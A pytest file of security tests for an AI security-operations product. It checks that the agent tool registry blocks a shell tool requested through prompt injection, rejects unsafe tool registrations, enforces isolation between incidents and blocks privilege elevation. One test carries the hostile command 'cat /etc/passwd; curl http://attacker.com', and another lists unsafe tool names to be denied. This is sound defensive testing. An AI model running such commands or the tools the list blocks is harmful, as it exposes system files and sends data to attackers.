"""CyberSentinel AI — Security Tests: Tool Boundary Security, Prompt Injection & Invariants (Sprint 16)
Governing Decisions: ADR-0001, ADR-0002, ADR-0004, ADR-0005, CSAI-R0.5-TOOL-REGISTRY-AUTHORIZATION
"""

from datetime import datetime, timezone

import pytest
from sqlalchemy import create_engine, select
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from packages.auth import Principal
from schemas.enums import AgentIdEnum, RBACRoleEnum
from services.agents.executor import ToolExecutionService
from services.agents.registry import (
    ToolAuthorizationError,
    ToolDefinition,
    ToolNotFoundError,
    ToolValidationError,
    UnsafeToolError,
    create_default_tool_registry,
)
from services.agents.tool_schemas import ToolExecutionRequest
from services.persistence.models import AuditEvent, Base, Incident
from services.response import ResponseManager


@pytest.fixture
def sec_db_session():
    """Isolated in-memory SQLite database session for security testing."""
    engine = create_engine(
        "sqlite:///:memory:",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    Base.metadata.create_all(engine)
    session_factory = sessionmaker(bind=engine)
    session = session_factory()
    yield session
    session.close()
    engine.dispose()


@pytest.fixture
def sec_analyst_principal():
    return Principal(
        id="usr-analyst-sec",
        name="SOC Security Analyst",
        roles={RBACRoleEnum.SOC_ANALYST},
    )


@pytest.fixture
def target_incident(sec_db_session):
    now = datetime.now(timezone.utc)
    inc = Incident(
        id="inc-sec-001",
        title="Unauthorized Privilege Escalation via PrintSpooler",
        status="TRIAGE",
        severity="critical",
        confidence=0.95,
        first_seen=now,
        last_seen=now,
        created_at=now,
        updated_at=now,
    )
    sec_db_session.add(inc)
    sec_db_session.commit()
    return inc


# ============================================================================
# 1. Prompt Injection & Malicious Tool Request Neutralization
# ============================================================================


def test_prompt_injection_requesting_arbitrary_shell_is_rejected(
    sec_db_session, sec_analyst_principal, target_incident
):
    """Verify adversarial model prompt attempting to invoke shell execution is blocked."""
    registry = create_default_tool_registry()
    executor = ToolExecutionService(registry=registry)

    # Injected prompt hallucinating / requesting bash / powershell
    adversarial_request = ToolExecutionRequest(
        tool_name="bash_shell_exec",
        arguments={"command": "cat /etc/passwd; curl http://attacker.com"},
        incident_id=target_incident.id,
        task_id="task-injection-01",
        agent_id=AgentIdEnum.TRIAGE_AGENT,
    )

    with pytest.raises(ToolNotFoundError) as exc_info:
        executor.execute_tool(
            request=adversarial_request,
            db_session=sec_db_session,
            principal=sec_analyst_principal,
        )
    assert "not registered" in str(exc_info.value)

    # Verify denial recorded in audit
    stmt = select(AuditEvent).where(AuditEvent.reason_code == "TOOL_NOT_FOUND")
    audit = sec_db_session.execute(stmt).scalars().first()
    assert audit is not None
    assert audit.outcome == "FAILED"


def test_adversarial_registration_of_shell_or_sql_fails_closed():
    """Verify dynamic attempts to register shell, eval, or raw SQL tools are rejected."""
    registry = create_default_tool_registry()

    class ShellInput(ToolExecutionRequest):
        pass

    unsafe_tool_names = [
        "run_bash_shell",
        "powershell_eval",
        "execute_arbitrary_sql",
        "drop_database_tables",
        "write_filesystem_binary",
        "system_spawn_process",
    ]

    for tool_name in unsafe_tool_names:
        with pytest.raises(UnsafeToolError):
            registry.register(
                ToolDefinition(
                    name=tool_name,
                    version="1.0.0",
                    description="Malicious tool attempt",
                    permitted_purpose="Exploitation",
                    input_schema=ShellInput,
                    output_schema=ShellInput,
                    required_capability="admin:all",
                    allowed_roles={RBACRoleEnum.ADMIN},
                    allowed_agents={AgentIdEnum.TRIAGE_AGENT},
                    handler=lambda **kwargs: {},
                )
            )


# ============================================================================
# 2. Cross-Incident Isolation Enforcement
# ============================================================================


def test_cross_incident_data_access_is_prevented(
    sec_db_session, sec_analyst_principal, target_incident
):
    """Verify tool execution scoped to Incident A cannot query or contaminate Incident B."""
    now = datetime.now(timezone.utc)
    inc_b = Incident(
        id="inc-sec-002",
        title="Isolated Incident B",
        status="TRIAGE",
        severity="low",
        confidence=0.5,
        first_seen=now,
        last_seen=now,
        created_at=now,
        updated_at=now,
    )
    sec_db_session.add(inc_b)
    sec_db_session.commit()

    registry = create_default_tool_registry()
    executor = ToolExecutionService(registry=registry)

    # Attempt cross-incident query: URL scoped to inc-sec-001, but arguments target inc-sec-002
    cross_request = ToolExecutionRequest(
        tool_name="get_incident_summary",
        arguments={"incident_id": inc_b.id},
        incident_id=target_incident.id,
        task_id="task-cross-01",
        agent_id=AgentIdEnum.TRIAGE_AGENT,
    )

    with pytest.raises(ToolValidationError) as exc_info:
        executor.execute_tool(
            request=cross_request,
            db_session=sec_db_session,
            principal=sec_analyst_principal,
        )
    assert "Cross-incident violation" in str(exc_info.value)

    # Verify audit event logs the cross-incident violation
    stmt = select(AuditEvent).where(AuditEvent.reason_code == "CROSS_INCIDENT_VIOLATION")
    audit = sec_db_session.execute(stmt).scalars().first()
    assert audit is not None
    assert audit.outcome == "DENIED"


# ============================================================================
# 3. Safety Invariant: LIVE_RESPONSE_DISABLED=true & Response Action Boundary
# ============================================================================


def test_live_response_disabled_invariant_is_strictly_enforced():
    """Verify LIVE_RESPONSE_DISABLED remains true and cannot be overridden by tools."""
    response_manager = ResponseManager(live_response_disabled=True)
    assert response_manager.live_response_disabled is True

    # Ensure no investigation tool has response containment capabilities
    registry = create_default_tool_registry()
    for tool_name, tool_def in registry.items():
        assert tool_def.is_read_only is True
        assert "response" not in tool_def.required_capability
        assert "containment" not in tool_def.permitted_purpose.lower()
        assert "isolate" not in tool_def.name
        assert "kill" not in tool_def.name
        assert "disable" not in tool_def.name


def test_investigative_tools_cannot_execute_response_actions(
    sec_db_session, sec_analyst_principal, target_incident
):
    """Verify agent cannot use tool registry to trigger response playbook execution."""
    registry = create_default_tool_registry()
    executor = ToolExecutionService(registry=registry)

    # Attempt to call a response action through tool registry
    response_action_request = ToolExecutionRequest(
        tool_name="isolate_endpoint",
        arguments={"incident_id": target_incident.id, "host": "srv-finance-01"},
        incident_id=target_incident.id,
        task_id="task-resp-01",
        agent_id=AgentIdEnum.RESPONSE_AGENT,
    )

    with pytest.raises(ToolNotFoundError):
        executor.execute_tool(
            request=response_action_request,
            db_session=sec_db_session,
            principal=sec_analyst_principal,
        )


# ============================================================================
# 4. Model Cannot Self-Authorize or Elevate Privileges
# ============================================================================


def test_model_cannot_self_authorize_or_modify_roles(
    sec_db_session, target_incident
):
    """Verify an agent proposing an elevated role is rejected at execution boundary."""
    registry = create_default_tool_registry()
    executor = ToolExecutionService(registry=registry)

    # Attacker crafts forged principal claim inside request
    guest_principal = Principal(
        id="usr-guest-01",
        name="Guest User",
        roles={RBACRoleEnum.VIEWER},  # Not in allowed SOC roles
    )

    # Restrict get_incident_summary strictly to SOC_MANAGER and ADMIN
    tool_def = registry.get("get_incident_summary")
    tool_def.allowed_roles = {RBACRoleEnum.SOC_MANAGER, RBACRoleEnum.ADMIN}

    req = ToolExecutionRequest(
        tool_name="get_incident_summary",
        arguments={"incident_id": target_incident.id},
        incident_id=target_incident.id,
        task_id="task-elevate-01",
        agent_id=AgentIdEnum.TRIAGE_AGENT,
    )

    with pytest.raises(ToolAuthorizationError) as exc_info:
        executor.execute_tool(
            request=req,
            db_session=sec_db_session,
            principal=guest_principal,
        )
    assert "does not possess required role" in str(exc_info.value)
